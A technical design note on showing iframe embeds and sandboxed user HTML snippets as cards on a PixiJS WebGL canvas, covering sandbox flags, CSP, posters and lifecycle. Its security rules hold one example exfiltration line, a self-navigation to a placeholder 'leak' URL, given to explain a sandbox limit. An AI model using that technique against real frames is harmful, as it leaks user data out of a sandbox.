# HTML content cards (embeds and snippets) on a WebGL infinite canvas

Research date: 2026-10-12. Context: PixiJS v8 canvas, 1000+ media cards, culling + LOD textures, existing camera-synced DOM layer used for live `<video>`.

> **Updated 2026-10-25.** Sections 1-10 are the original research. What the library ships today departs from §6 on purpose (every card in view goes live, frames are kept and culled rather than destroyed, small snippets freeze to a snapshot): see **§11, Embed lifecycle as implemented**.

## TL;DR

- **Hybrid LOD is confirmed.** Poster texture in WebGL under every card; a live sandboxed `<iframe>` in the camera-synced DOM layer over it. (The research proposed iframes only for the few big, focused cards; the implementation mounts every card in view and keeps the cost down by culling, freezing and pausing instead: §11.)
- **HTML-in-Canvas does not replace the iframe path.** It cannot paint cross-origin iframe content (by design), it is Chromium-only, and it is still an origin trial. At most it is a progressive enhancement for same-origin, non-iframe snippets.
- **Posters come from the network, not the browser.** oEmbed `thumbnail_url`, then `og:image`, then a server-side screenshot. In-browser rasterizers cannot see cross-origin iframes.
- **Snippets run in `sandbox="allow-scripts"` `srcdoc` iframes** (opaque origin). A tiny injected script serialises its own DOM and `postMessage`s it out; the parent rasterises it into the card's poster (§11).

## 1. Technique comparison

| Technique | Fidelity | Interactive | Cross-origin | Perf @1000 cards | Browser support | Complexity |
|---|---|---|---|---|---|---|
| **A. DOM iframe overlay** (CSS `matrix()` layer synced to camera) | Perfect (real browser) | Yes (full) | Yes, except sites sending `X-Frame-Options`/`frame-ancestors` | Only OK if live count is capped (each cross-site iframe is a process under Site Isolation) | All | Medium (lifecycle, z-order, input) |
| **B. Poster texture in WebGL** (oEmbed/og:image/screenshot) | Static image | No | n/a (fetched server-side) | Excellent (same as image cards) | All | Low-medium (poster pipeline) |
| **C. HTML-in-Canvas** (`drawElementImage` / `texElementSubImage2D`) | Native renderer | Yes (DOM stays real, hit-testing synced) | **No: cross-origin iframe content is not painted** | Good for few elements; main-thread bound | Chromium only, origin trial | Medium-high |
| **D. SVG `foreignObject` snapshot** (modern-screenshot, html-to-image, html2canvas) | Approximate (fonts/images must be inlined, bugs in Safari) | No | Same-origin only; **iframes not captured** | Slow per capture (tens to hundreds of ms, main thread); fine as one-shot | All (with quirks) | Medium |
| **E. Server-side screenshot** (headless Chromium, e.g. Cloudflare Browser Rendering `/screenshot`) | High, runs JS | No | Yes, but bot-blocked/consent-walled pages fail | Excellent (cached image) | n/a | Medium (infra, cost, SSRF) |
| **F. Sandboxed `srcdoc` iframe** (user snippets) | Perfect | Yes | Opaque origin, isolated | Same as A | All | Low |

Verdict: **A + B (+ E for posters) is the baseline. F covers snippets. C and D are optional enhancements for snippets only.**

## 2. How existing canvas apps do it (what is documented)

| App | Evidence |
|---|---|
| **tldraw** | Embed shape = iframe in the HTML layer. Single click selects; **double-click/Enter enters edit mode where pointer events reach the iframe**; Esc/click-outside exits. Per-provider sandbox, allowlisted hostnames; unrecognized URLs become **bookmarks**. YouTube/Vimeo lock aspect ratio; Vimeo corrects to real aspect after creation. Pasted raw iframe code gets a stricter sandbox (no same-origin). ([embed shape](https://tldraw.dev/sdk-features/embed-shape), [persistent iframe](https://tldraw.dev/examples/persistent-iframe-shape)) |
| **Excalidraw** | Read from source ([App.tsx](https://github.com/excalidraw/excalidraw/blob/master/packages/excalidraw/components/App.tsx)): wrapper uses `translate(...) scale(zoom)`; **mounts an iframe only when in viewport, then keeps it mounted and hides with `display:none`** (`initializedEmbeds`); `pointer-events` is `none` until state `active` (hover shows an "interact" hint, click activates); `sandbox="allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-presentation allow-downloads"` plus `allow-same-origin` only for allowlisted providers; `allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"`; no `loading` attr; video embeds are counter-scaled (clamped 0.75..4) to stay sharp. CVE-2024-32472 was a stored XSS from `allow-same-origin` ([advisory](https://security-tracker.debian.org/tracker/CVE-2024-32472)). |
| **FigJam** | Embed node has `srcUrl` "loaded in an iFrame **when the embed is activated**", plus `canonicalUrl`, `title`, `provider` ([EmbedData](https://developers.figma.com/docs/plugins/api/EmbedData)). Inactive state = static card. |
| **Miro** | Community thread shows a generic thumbnail + play overlay for iframe embeds ([thread](https://community.miro.com/ideas/better-handling-of-iframe-embedding-16332)). Loading internals not documented. |
| Milanote, Muse, Kosmik, Are.na, Heptabase | **No public documentation found** for their embed loading strategy. Do not assume; the pattern above (placeholder until activated) is the only evidenced one. |

Common pattern: inert placeholder by default, interaction is an explicit mode, allowlist of providers, bookmark fallback.

## 3. HTML-in-Canvas (WICG) status, October 2026

- **What it is:** `<canvas>` children are laid out but not painted; `paint` event + `requestPaint()`; `drawElementImage()` (2D), WebGL and WebGPU texture upload variants. Explainer: [WICG/html-in-canvas](https://github.com/WICG/html-in-canvas), spec draft: [wicg.github.io/html-in-canvas](https://wicg.github.io/html-in-canvas/).
- **Chrome:** DevTrial in Chrome 138; **origin trial started 148** ([Intent to Experiment](https://groups.google.com/a/chromium.org/g/blink-dev/c/t_nGEmJ_v4s), [OT announcement](https://developer.chrome.com/blog/html-in-canvas-origin-trial)); **now extended through Chrome 160 and not shipped to stable** ([OT changes](https://developer.chrome.com/blog/html-in-canvas-ot-changes)). Local testing: `chrome://flags/#canvas-draw-element`.
- **API is still moving.** Chrome 155+ renames: `layoutsubtree` -> `content="drawable"` (+ `drawable` attr on descendants); WebGL `texElementImage2D` -> **`texElementSubImage2D`** (no storage allocation, pre-allocate with `texImage2D`); WebGPU `copyElementImageToTexture` -> `drawElementImageToTexture`; `drawElementImage()` returns `void`; for WebGL you call `canvas.updateElementGeometry(el, { canvasTransform })` yourself. Blog posts written before this still show the old names.
- **Other engines:** Gecko "No Signal" (earlier text said Negative; Gecko flags synchronous-paint implementation challenges), WebKit "No Signal" ([mozilla/standards-positions#1076](https://github.com/mozilla/standards-positions/issues/1076), [WebKit#630](https://github.com/WebKit/standards-positions/issues/630)). No implementation outside Chromium.
- **Cross-origin iframes: refuted as a use case.** Privacy model is "read-back-allowed rendering": cross-origin content in iframes, images, `url()` refs, cross-origin SVG, and tainted canvases is **not painted**; same-origin iframes paint, but cross-origin content inside them does not ([explainer, Privacy and Security](https://github.com/WICG/html-in-canvas)). Chrome says the same: "does not work with cross-origin iframe content" ([OT post](https://developer.chrome.com/blog/html-in-canvas-origin-trial)). Also: a `sandbox` iframe without `allow-same-origin` has an opaque origin, so I expect it is treated as cross-origin and not painted (inference, not tested).
- **Other constraints:** only direct canvas children are drawable; Pixi's canvas would have to host the HTML children; the paint model is main-thread; video is not mentioned as supported.
- **Where it could help:** same-origin, script-free, sanitized user HTML (rendered as a real DOM child, no iframe) drawn into a Pixi texture, giving WebGL-composited z-order and effects. Feature-detect `'texElementSubImage2D' in WebGL2RenderingContext.prototype`, keep the sanitized-DOM snapshot (D) or sandboxed iframe (F) as fallback. **Not worth building before it ships to stable.**

## 4. Poster pipeline (the low-LOD texture)

Order of preference, first hit wins; always cache the result to **our own storage** and serve it same-origin or with CORS.

1. **oEmbed `thumbnail_url`** (+ width/height; all-or-nothing per [spec](https://oembed.com/)). Cheap, official, correct aspect hints.
2. **OpenGraph `og:image`** fetched server-side (CORS blocks the browser from reading arbitrary pages).
3. **Server-side screenshot** of the URL (or of the `html` for snippets). Cloudflare Browser Rendering `/screenshot` accepts `url` or `html`, `viewport`, `deviceScaleFactor`, `selector`, `gotoOptions.waitUntil`, `addStyleTag` ([docs](https://developers.cloudflare.com/browser-rendering/rest-api/screenshot-endpoint/)). Always identified as bot traffic (no bypass). Free plan: 10 min browser time/day, 6 REST requests/min; paid: 600/min, $0.09 per extra hour ([limits](https://developers.cloudflare.com/browser-rendering/limits/), [pricing](https://developers.cloudflare.com/changelog/post/2025-07-28-br-pricing/)). Queue it, never block insert on it.
4. **Generated tile** drawn in Pixi (favicon + title + host) if everything fails.

Gotchas:
- A third-party image in a WebGL texture needs CORS (`crossorigin="anonymous"` + `Access-Control-Allow-Origin`), otherwise upload fails/taints. This is why posters must be re-hosted, not hot-linked (`i.ytimg.com` etc. also may change URLs).
- Server fetching user URLs is an **SSRF** vector: block private/loopback/link-local IPs, cap size/time, follow redirects manually.
- Treat poster as a normal media asset: generate the same LOD ladder/mips as image cards.

## 5. Provider matrix (oEmbed / embed URLs)

Checked live with `curl` on 2026-10-12 unless noted.

| Provider | oEmbed | Iframe in response | Poster | Notes |
|---|---|---|---|---|
| YouTube | `youtube.com/oembed?format=json&url=` OK, no auth | Yes (`/embed/ID`, with `allow=` list) | `thumbnail_url` (480x360 hqdefault) | `width/height` are tiny defaults (200x113); aspect is 16:9, ignore returned size |
| Vimeo | `vimeo.com/api/oembed.json?url=` (public per docs) | Yes (`player.vimeo.com`) | `thumbnail_url` | My two sample IDs returned 404 from curl: verify before relying. Real aspect differs per video (tldraw re-sizes after create) |
| Spotify | `open.spotify.com/oembed?url=` OK, no auth | Yes (`iframe_url`, `loading="lazy"`) | `thumbnail_url` | Fixed heights (152/352) |
| X / Twitter | `publish.twitter.com/oembed?url=` OK | **No: `<blockquote>` + `widgets.js`**, `height: null` | none | `x.com` itself sends `X-Frame-Options: SAMEORIGIN`. Needs script injection (put in sandboxed srcdoc) or a screenshot-only card. Needs testing |
| Instagram / Meta | Graph `instagram_oembed`; token requirement has flip-flopped in 2026 (undocumented tokenless reports) and thumbnail fields were removed Nov 2025 ([feedframer](https://feedframer.com/guides/instagram-post-embed), [WPMayor](https://wpmayor.com/meta-tokenless-oembed-wordpress/)) | `/p/ID/embed/` URL loadable | Screenshot | Do not depend on oEmbed; use embed URL + screenshot, mark best-effort |
| Figma | `GET /v1/oembed`, needs OAuth scope `file_metadata:read` ([docs](https://developers.figma.com/docs/rest-api/oembed-endpoints/)); `figma.com` itself sends `SAMEORIGIN` | Use Figma's embed host URL (as tldraw does) | Screenshot | Token + scope required for thumbnail |
| CodePen | oEmbed behind Cloudflare challenge for plain curl; `/embed/` path used by tldraw | `/embed/ID` | Screenshot | Treat endpoint as unreliable server-side; derive embed URL by pattern |
| Arbitrary URL | oEmbed discovery via `<link rel="alternate" type="application/json+oembed">` or `Link` header | maybe | `og:image` | **Probe framing headers server-side** (below) |

**Frame-blocking is not detectable from the client** (cross-origin `onload`/`onerror` tell you nothing). At insert time, a server `HEAD`/`GET` reads `X-Frame-Options` and CSP `frame-ancestors`. Observed today: `github.com` sends `X-Frame-Options: deny`, `x.com` and `figma.com` send `SAMEORIGIN`; `youtube.com/embed/*` sends none. Store `framable: 'yes'|'no'|'unknown'` + timestamp; `no` => bookmark card (poster + "Open in new tab"). Re-check lazily (headers change).

## 6. Recommendation

> The original recommendation, kept for its reasoning. The shipped lifecycle (§11) differs: no size threshold or 4-frame cap by default, and off-screen frames are hidden with `display:none` within a budget instead of destroyed, because destroying them meant reloading and a poster flash every time a card came back.

**Hybrid LOD, three states per embed card:**

1. **`poster`** (default, all cards): Pixi sprite with the poster texture + a play/globe badge. Participates in culling, LOD, selection, z-order like any media card. Zero DOM.
2. **`armed`** (optional): card is selected/hovered or is the best live candidate; DOM iframe is created hidden-but-loading (`visibility:hidden`) so the switch is instant.
3. **`live`**: iframe visible in the camera-synced DOM layer above the canvas; Pixi sprite hidden (or faded once iframe `load` fires, to avoid a flash). Pointer events off until the user opts in.

Reuse the existing `<video>` overlay machinery: same layer container, same `matrix(a,b,c,d,e,f)` camera sync, same pool/eviction code. Make the iframe a second pooled element type, not a new system.

### Activation policy (starting values, tune with measurements)

| Rule | Value |
|---|---|
| Eligible for `live` | on-screen size >= 320x200 CSS px **and** >= ~12% of viewport area, **or** explicitly selected/focused at any size |
| Never live while | camera is moving (pan/zoom/pinch in progress) or zoom-gesture velocity > threshold; wait ~250 ms idle |
| Max live iframes | **4** desktop / **1** touch. Count audio/video-playing embeds as pinned |
| Eviction | LRU by last focus; on evict, **destroy** (remove node, `src="about:blank"` first) and return to `poster`. Do not `display:none` (Excalidraw does; the document and its process stay alive) |
| Cull | Off-screen => destroy, unless currently playing media and the user pinned it |
| Interaction | Live iframes start `pointer-events: none` so wheel/drag pan the board. **Click selects. Double-click / Enter / an "Interact" button sets `pointer-events: auto`** (tldraw and Excalidraw model). Exit: click outside the iframe, or a visible "Done" button |
| Zoomed far out | Below ~0.25 screen scale never mount, regardless of selection |

Gotchas for the interaction model:
- **Keys and wheel inside a cross-origin iframe never reach the parent.** Esc only works if focus is outside the iframe; offer a button and click-outside. Pinch-zoom (ctrl+wheel) inside the iframe won't zoom the board.
- Clicks on the iframe do not bubble; use a transparent shield `<div>` over the iframe in non-interactive mode if you need hover/drag on the card body (iframe `pointer-events:none` already gives this, since the event hits the wrapper beneath).
- Drag/resize handles must live on the wrapper, outside the iframe box (drawn in DOM, since Pixi cannot draw above the DOM layer).

### Layering and z-order

- The DOM layer is a single slab: it is wholly above or wholly below the canvas. **Put it above.** Consequence: Pixi content (other cards overlapping, selection chrome, connectors) cannot render over a live iframe.
- Mitigation that fits the policy: **a live card is promoted to the top** (z-order is a temporary property of the live state), and selection/resize handles for it are DOM elements in the same layer. Cards in `poster` state keep correct z-order in WebGL.
- Alternative (hole-punch): canvas above with `alpha:true`, iframe layer below, card rect cleared transparent. Gives correct z-order for free but the canvas then eats all pointer events, so interactive mode must still lift the iframe above. Not worth the complexity.
- Rotated cards: iframe takes the same `rotate()`; keep rotation for posters but consider flattening to 0 while live.

### Crispness and scale

- Lay the iframe out at the card's **world size** (e.g. 800x450), apply the camera as the CSS `matrix()` (like Excalidraw's `translate+scale`). Text re-rasterizes at the new scale; avoid `will-change: transform` on the iframe wrapper, which can freeze raster scale and blur on zoom-in (verify in your target Chrome/Safari).
- Alternative for media-heavy embeds: lay out at screen size and counter-scale (`scale(1/k)`, clamp k to 0.75..4, as Excalidraw does for video). It keeps the embedded page's responsive layout at the size the user actually sees; costs a reload-free but layout-heavy resize on every zoom step, so apply only at zoom end (debounced).
- Cap iframe layout size (e.g. <= 2048 px per side) to bound raster memory.

### Security attributes

| Content | `sandbox` | Other |
|---|---|---|
| **Allowlisted provider** (YouTube, Vimeo, Spotify, Figma, CodePen, ...) | `allow-scripts allow-same-origin allow-forms allow-popups allow-presentation` | `allow="autoplay; encrypted-media; picture-in-picture; clipboard-write; fullscreen"` per provider; `referrerpolicy="strict-origin-when-cross-origin"`; `allowfullscreen` |
| **Arbitrary URL** (only if `framable=yes`) | `allow-scripts allow-same-origin allow-forms allow-popups` | empty `allow`; never `allow-top-navigation*`, `allow-modals`, `allow-pointer-lock`, `allow-downloads`, `allow-popups-to-escape-sandbox` |
| **User snippet** | `allow-scripts` only (no `allow-same-origin`, no `allow-forms`, no `allow-popups`) | `srcdoc=`; inject `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src data: https:; style-src 'unsafe-inline'; script-src 'unsafe-inline'; font-src https: data:">`; empty `allow` |

Rules:
- `allow-same-origin` is safe only when the framed origin differs from the app origin. **Never combine `allow-scripts` + `allow-same-origin` on `srcdoc` or same-origin URLs**: the framed script can remove its own sandbox (this is the Excalidraw CVE class).
- The sandbox profile is **derived at render time from `source.type` + provider allowlist, never stored in the document**, so a tampered/shared board cannot escalate.
- Defense in depth for snippets: serve them from a separate cookieless origin (`https://snippets.<domain>/frame.html` + `postMessage`) instead of `srcdoc`, so even a sandbox bug lands on an empty origin.
- Sandboxed opaque-origin frames have no `localStorage`/cookies; snippets using them will throw. Document it in the editor.
- Normalize URLs to `https:`; reject `javascript:`, `data:`, `file:`, `blob:` for `url` embeds. Keep the original URL and the derived `embedUrl` separate (as tldraw does).
- `credentialless` iframes ([Chrome 110+](https://developer.chrome.com/blog/iframe-credentialless)) only matter if the app becomes cross-origin isolated (COEP) for SharedArrayBuffer/WASM threads: then cross-origin embeds without CORP will refuse to load unless `credentialless` is set. Plan for it if you enable COOP/COEP.
- **Best-effort guards.** Dropping `allow-same-origin` for the app's own origin (and for `isolatedHosts`) only looks at the URL a frame starts with. A redirect, or a link followed in interact mode, can land on the app origin with `allow-scripts allow-same-origin`. Never serve user-controlled HTML on the board's origin.
- **Snippets are not offline, and `snippetNetwork: 'none'` is advisory.** The default CSP allows `img-src https:` and `font-src https:` (`snippetNetwork: 'images'`); `'none'` restricts to `data:` / `blob:`, which blocks subresource requests (images, fonts, `fetch`...) but **not a self-navigation**: a snippet can run `location.href = 'https://x/leak?...'` (or a link, or a meta refresh), and neither the CSP nor the sandbox can stop a frame from navigating itself. **The request itself always leaves**, and its URL can carry data out. The page that answers is not under the snippet CSP: Chromium enforces the CSP on it anyway (see the next point); on other engines it runs with `allow-scripts` for as long as it likes. So `'none'` is best effort, not isolation. The only real isolation is serving snippets from a separate origin (their own domain, or a sandboxed proxy), which is future work.
- **Chromium: the CSP follows the frame (Embedded Enforcement).** A snippet's iframe carries the snippet CSP in its `csp` attribute (also on the hidden preview frames). Chromium then requires every document loaded in that frame to accept the policy: its own `srcdoc` and the bootstrap do (pause, snapshots and previews work as without it), but a page the frame navigates to that does not send `Allow-CSP-From` is blocked instead of run, so a hostile snippet cannot run its own page there. Defence in depth, Chromium only (Firefox and Safari ignore the attribute, and it does not stop the request, see above). The e2e suite checks both: the snippet works under the attribute, and a navigated-to page does not run its script.
- **The navigation guard is best effort against accidents, not a security boundary.** It exists for a link clicked in interact mode or a stray `location` assignment. The layer remembers the iframe's `contentWindow` at the first `load`. A later `load` with a **different** window is a reparent (the host moved the board in the DOM, which makes a new browsing context that reloads the `srcdoc`) and is accepted. A later `load` in the **same** window is a navigation: the layer assigns the `srcdoc` again, which restores the snippet's document, and counts a strike; the load of that restored document is not a strike. **3 strikes within 10 s** (`NAV_STRIKES`, `NAV_STRIKE_MS`) block the card: the frame is torn down to its poster, an `error` event (`kind: 'embed'`) is emitted, `embeds.info(id)` returns `frameable: false, blocked: true`, and the card stays blocked until its content changes. What it cannot see: no frame-level signal identifies the document that loaded. A navigation during parse means the snippet's own `srcdoc` never fires `load` (the parent only sees the other page's), and a page with a never-finishing subresource fires no `load` at all while its scripts run. A hostile snippet can therefore keep another page in its frame, outside the snippet CSP, for as long as it likes on engines without Embedded Enforcement. Do not rely on the guard to contain untrusted HTML; serve it from a separate origin.
- **Host CSP.** A `srcdoc` iframe inherits the host page's CSP. A nonce-based `script-src` blocks the bootstrap and the snippet's scripts, so snapshots and pause time out. The `<style>` elements the layer injects take the board's `nonce` option, for a nonce-based `style-src`.
- Snapshot replies over 2 MB of SVG are dropped (a hostile snippet cannot make the parent parse arbitrary amounts of markup).
- Export/share: public boards render `poster` only (like tldraw's SVG export draws blank placeholders), and the iframe loads only for viewers.

## 7. User-authored HTML snippets

- **Render:** `<iframe sandbox="allow-scripts" srcdoc="...">` (profile above). Opaque origin: scripts run, no access to cookies/storage/parent DOM ([MDN CSP sandbox](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox)).
- **Poster (shipped, see §11):** the bootstrap serialises the document and the parent rasterises it; no DOM rasterizer library is bundled.
- **Poster (original idea):** inject a small bootstrap into `srcdoc` that, on `load` + idle, runs a bundled DOM rasterizer (modern-screenshot/html-to-image) on its **own** document and `postMessage`s a PNG/WebP blob to the parent. The parent checks `event.source === iframe.contentWindow`, size/MIME limits, then stores it as the poster. Works with JS-generated content and needs no server. Caveat: the snippet can post a fake image to its own card (harmless), and `foreignObject` rasterizing has Safari quirks (see [WebKit 43911](https://bugs.webkit.org/show_bug.cgi?id=43911)).
- **Poster (fallback):** Cloudflare Browser Rendering `/screenshot` with the `html` param (runs JS, no snapshot script needed, but metered).
- **Sanitized static variant:** if the editor offers a "no scripts" mode, sanitize with DOMPurify, render in a hidden same-origin container, snapshot with D, and (Chromium + origin trial) optionally upload as texture via HTML-in-Canvas. Do not do this for script-enabled snippets (the sandbox would block readback).
- **Size limits:** cap source at ~256 KB, cap `srcdoc` iframe layout size. `requestAnimationFrame`-heavy snippets are throttled by pausing (the bootstrap gates rAF and pauses Web Animations) and by freezing small ones to a snapshot, not by destroying the iframe (§11).

## 8. Element model

```ts
type EmbedElement = {
  id: string; kind: 'embed';
  x: number; y: number; w: number; h: number; rotation?: number;
  source:
    | { type: 'url'; url: string;            // what the user pasted (https only)
        embedUrl?: string;                   // derived provider embed URL
        provider?: 'youtube' | 'vimeo' | 'spotify' | 'figma' | 'codepen' | 'x' | 'instagram' | 'generic';
        framable?: 'yes' | 'no' | 'unknown'; framableCheckedAt?: number }
    | { type: 'html'; html: string };        // user snippet, executed only in sandbox
  poster?: {                                 // our own storage, CORS-enabled
    src: string; w: number; h: number;
    origin: 'oembed' | 'og' | 'screenshot' | 'snapshot' | 'generated';
    capturedAt: number;
  };
  aspect: number;                            // w/h, from oEmbed/poster/known provider
  lockAspect: boolean;                       // true for video providers
  interactive: 'click' | 'always' | 'never'; // activation mode; default 'click'
  title?: string;
};
// NOT stored: sandbox flags, allow list, live/armed/poster state (derived at runtime).
```

`interactive: 'never'` => card stays a poster forever (safe for shared/read-only boards). `'always'` is for the owner's pinned embeds and still obeys the live cap.

## 9. Memory / CPU notes

- Cross-site iframes are out-of-process under Site Isolation (desktop since Chrome 67) ([OOPIF design doc](https://chromium.org/developers/design-documents/oop-iframes)); that is the main cost. Third-party figures of 20-100 MB per subframe process are unverified: **measure** with Chrome Task Manager on your target embeds before fixing the cap.
- `loading="lazy"` helps only for iframes below the fold in normal flow and thresholds vary by connection ([Chromium blog](https://blog.chromium.org/2019/10/automatically-lazy-loading-offscreen.html)). With explicit mount/unmount it is redundant; set it anyway as a harmless guard.
- Reparenting an iframe reloads it, unless `Node.moveBefore` is used (Chromium 133+, Firefox 144+) and the node stays connected ([tldraw](https://tldraw.dev/examples/persistent-iframe-shape)). Avoid moving live iframes between containers (e.g. when promoting z-order, reorder via `z-index`, not DOM moves).
- Keep one shared transform on the layer container for pan (compositor-only) and per-iframe transforms only for zoom/size changes.

## 10. Build order

1. `EmbedElement` + poster-only rendering (URL paste -> oEmbed/og:image -> poster, bookmark fallback). Ships value alone.
2. Live iframe state in the existing DOM overlay: pooled element, activation policy, click-to-interact, provider sandbox profiles, framing probe.
3. Snippets (`srcdoc` sandbox + bootstrap snapshot for the poster).
4. Server screenshot queue for pages without thumbnails.
5. HTML-in-Canvas experiment behind a flag, only after Chrome stable ships it.

## 11. Embed lifecycle as implemented (2026-10-25)

Code: `src/embed/policy.ts` (which frames are mounted, pure rules), `src/embed/layer.ts` (DOM, timers, snapshots, pause), `src/embed/bootstrap.ts` (the script injected into snippets). Demo: `demo/embeds.html` (the two original bugs) and `/?windows=1000`.

### States

```
poster ──(in view, camera still)──▶ loading ──(load)──▶ live
  ▲                                                     │  ▲
  │                                       small/out of  │  │ big again / selected
  │                                       active budget ▼  │
  │                                                   parked ──(small snippet)──▶ frozen
  │                                                     │
  │                                    off screen       ▼
  └──────(past maxOffscreen / maxMounted)──────────── culled
```

| State | What the user sees | DOM | Cost |
|---|---|---|---|
| `poster` | The WebGL sprite: provider thumbnail, host poster, generated tile, or the card's last snapshot | none | a texture |
| `loading` | The poster under a dark veil with a spinner | iframe, `opacity:0` | page load; at most `maxLoading` (6) at once, nearest the view centre first; a frame that never loads gives its slot up after 8 s |
| `live` | The iframe | iframe over the sprite | full page |
| `parked` | The iframe, still showing its page | iframe, inert | snippets paused (rAF gated, animations paused), YouTube/Vimeo paused on the current frame |
| `frozen` | A snapshot of the snippet's current frame, as the sprite's texture | iframe `display:none`, alive | none; thaws instantly |
| `culled` | Nothing (off screen) | iframe `display:none`, alive | none; shows again instantly |

A frame that has gone live is **never swapped back to its poster for being small**. It only goes back to a poster when it is destroyed: removed card, over the culled or mounted budget, or its embed changed.

### Rules and defaults (`EmbedOptions`)

| Option | Default | Meaning |
|---|---|---|
| `minLivePx`, `minLiveScale` | `0`, `0` | Any card in view goes live, whatever its size or zoom. `320` / `0.25` restore the research's thresholds |
| `maxLive` / `maxLiveTouch` | 12 / 3 | Active frames (mounted and allowed to run): `board.stats().embeds.active` against `embeds.maxLive`; `embeds.live` counts the parked ones too (`live = active + parked`). `Infinity` = no cap |
| `maxMounted` / `maxMountedTouch` | 24 / 6 | Active + parked + culled |
| `maxOffscreen` / `maxOffscreenTouch` | 64 / 12 | Culled frames kept alive, most recently seen first; the rest are destroyed when the camera settles |
| `cullMargin` | 0.5 | A card counts as on screen up to half a viewport past each edge: it keeps rendering, and cards entering the ring mount ahead of the pan |
| `maxLoading` | 6 | Iframes loading at once (chunked start) |
| `freezePx` | 140 | A snippet whose short side is under this many CSS px freezes to a snapshot; it thaws above 1.4× (hysteresis), when selected, or in interact mode. `0` disables. Raised up to 4× while the page stays slow with the animating budget at its floor (`freezeThreshold`) |
| `maxAnimating` | `Infinity` | Ceiling of frames allowed to animate |
| `adaptive` | `true` | Lowers the animating budget when the page runs slow (below) |
| `autoplay` | `false` | YouTube/Vimeo start muted and looping as soon as they go live |
| `previewWorkers` | 3 | Hidden frames that render snippet previews in the background. `0` disables |
| `previewCache` | `'memory'` | This page only; `'persistent'` (opt-in: it leaves pictures on the visitor's disk) also uses Cache Storage, which survives reloads; `{ persistent: true, name }` uses the Cache Storage entry `name` instead of `corkboard-previews-v2` |
| `snippetNetwork` | `'images'` | The snippet CSP: `'images'` allows `img-src data: https:` and `font-src https: data:` (still requests to any https server); `'none'` allows `data:` / `blob:` only: no subresource requests, but a snippet can still navigate itself (advisory, not isolation; see Security). Applies to frames mounted after a change |
| `isolatedHosts` | `[]` | Hosts whose frames never get `allow-same-origin`. Each entry is normalised once: a bare host (`example.com`, `bücher.de`, `.example.com`, `*.example.com`, `example.com:443`, `::1`) or a full URL (its host is taken); case, port, trailing dot and punycode do not matter. A domain entry covers the host and its subdomains; an IP literal (v4 or v6) matches exactly that address, never as a suffix. An entry with a path, credentials or a query, or that cannot be parsed, throws `CorkboardError` (`'invalid'`) from `create` / `setOptions`. Judged by the starting URL only |
| `resolve`, `resolveTimeoutMs` | none, `4000` | `board.embeds.setOptions` takes both for lookups started afterwards; a failed or timed-out lookup emits `error` (`kind: 'embed'`) and falls back to the URL |

Nothing changes while the camera moves; the plan runs when it settles. Culling and thawing are the exception: they are checked every frame, so frames hide the moment they leave and come back the moment they return.

### Posters are a stage override, not stored

Everything the layer generates for a card (tile, provider photo it fetched, cull/freeze snapshot, preview) is a blob URL that dies with the page. It used to be written into `media.src` with `store.update`; now it is `stage.setPosterOverride(id, url | null)`:

- The stage uses the override in place of `media.src` / `sizes` when it computes the card's texture URLs (L1, L2 and L3 all point at it; the ThumbHash is untouched). The store is never touched: no `change` event per snapshot, nothing for a host's autosave to persist, and the host's own `media.src` stays as it set it. Overrides are dropped with the element (and by a reload that no longer holds it).
- Which poster shows (`syncOverride`): a host `https:` / `data:` `media.src` wins over a tile or photo; a snapshot or preview of a snippet, which is the real picture, goes over it. A `blob:` `media.src` (an old saved board) counts as absent, so it gets a fresh poster. `embedResolved.poster` still reports only persistable URLs.
- No placeholder in between. The old poster's textures are not forgotten when the override changes: `TextureManager.swapPictures` moves levels 1..3 aside as `outgoing`, drops requests for the old URL, and `best()` keeps drawing the outgoing level (not the ThumbHash) until the first level of the new picture uploads, which releases them. Level 0 is the same ThumbHash and stays. An outgoing set is also released when the card is small or off screen, when the override goes with nothing to fall back to, and by `forget` / `reset`. The new picture failing to decode leaves the old one on screen. `stage.posterShown(id)` is true only once the *new* poster shows, which is what the freeze waits for before hiding the frame.
- A replaced URL is revoked 15 s later (`REVOKE_DELAY_MS`): the stage has by then cancelled its requests for it and holds decoded pixels, not the URL.

### Snapshots (frozen snippets, last frame)

- The layer posts `{ op: 'snapshot', id, w, h, vw, vh }` to the frame. The bootstrap clones the document (its stylesheets come along), bakes in the current value of whatever CSS / Web animations and transitions are changing, turns `<canvas>` elements into `data:` images, and answers with the SVG `<foreignObject>` markup.
- The **parent** draws that SVG on a canvas (WebP). Drawing in the frame stalled for seconds: browsers throttle small cross-origin frames, and the image decode and `toBlob` waited on them. Copying every computed property of every element also made each snapshot take ~3 s; baking only the animated properties brought it to tens of ms.
- At most 6 requests in flight; a failed one is retried twice, 2 s and 4 s later. A failure leaves the frame live, never a generic tile.
- When a loaded snippet leaves the view, its cull is deferred until a snapshot has been taken (or 400 ms), at most once every 3 s per frame. That way the poster under it is its last frame when it returns. Two snapshot slots are always kept for freezing. Not while the camera is panning or zooming fast (over 1.5 screen px per ms): the frame is hidden at once. The reply is drawn in the parent when the browser is idle.
- A reply frees the snapshot slot as soon as it is in, but its frame is not asked again until the picture it drew is applied (`drawing`), so one freeze is one snapshot. Each `load` of a page or player iframe is a new document: what the layer knew of the old one (paused, pending snapshot, retry, player timer) is reset, and the frame is sent again what it should be doing. A snippet's frame that loads something other than its `srcdoc` is given its document back, and blocked after 3 such navigations within 10 s (see Security; best effort).
- A reply whose SVG string is longer than 2 MB (`SNAPSHOT_MAX_SVG`) is treated as a failed snapshot, for live frames and studios alike.
- Limits: network images inside a snippet come out blank (an opaque origin cannot read them); a WebGL canvas without `preserveDrawingBuffer` comes out blank; Safari taints the canvas, so there the frame simply stays live.

### Previews (snippets that were never live)

A snippet card that has not been live only has a generated tile. A background queue gives it a real picture of the snippet instead; the tile is still drawn at once, so the card is never blank.

- **Queue**: every snippet card whose poster is the tile (or nothing), that is not mounted live, and has no picture of the host's. On screen first, nearest the view centre, then the rest by distance, ranked when each job starts (so a new view takes over on settle). Nothing starts while the camera moves.
- **Studio**: `previewWorkers` (3) hidden iframes owned by the layer, in `document.body`, `position:fixed; left:0; top:0; opacity:0; pointer-events:none; z-index:-1`, `inert`, `aria-hidden`, `tabindex=-1`. Same sandbox, CSP and bootstrap as a live frame, laid out at the same virtual screen and the card's aspect (bucketed to 2%). They take no `maxLoading` or snapshot slot, and are removed when the queue is empty.
